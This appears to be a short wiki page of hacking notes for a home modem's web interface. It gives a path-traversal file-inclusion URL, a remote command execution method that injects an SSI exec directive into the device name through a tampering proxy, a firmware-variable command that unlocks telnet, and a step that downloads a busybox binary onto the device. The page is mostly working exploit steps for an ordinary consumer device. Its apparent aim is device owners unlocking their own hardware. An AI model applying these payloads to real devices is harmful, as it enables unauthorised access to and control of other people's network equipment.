== WebUI Tricks ==
  * Engineering Menu: move your mouse over the device image, then hold ctrl+shift+e and click
  * Software Menu: move your mouse over the device image, then hold ctrl+alt+h
  * LFI: {{{http://192.168.15.1/cgi-bin/sysconf.cgi?page=../../[afile]&action=request&sid=[valid_sid]&timestamp=[valid_timestamp]}}}

== Remote Command Execution ==
  # load up TamperData, Charles, or some other tampering proxy
  # log into the device and change the Basic->Device Name to FOO
  # in your tampering proxy, change FOO to {{{<!--#exec cmd="<your command>" -->}}}
  # using the LFI above, get /etc/hosts
  # your command will be run, and you should see your results

== Software Unlock (enable telnet) ==
  # Using the above Remote Command execution trick, run the command: {{{ fw_setenv factory 1 }}}
  # reboot, and you can telnet right in.
  # this disabled most the startup scripts, so you need to set your own IP - try 192.168.15.2

  * /mnt/jffs2/conf/app/lighttpd.conf

== Missing busybox functions ==
just download http://www.busybox.net/downloads/binaries/1.16.0/busybox-armv4l to the modem, then use it.  It is a pre-built busybox binary that contains all the normal functions.
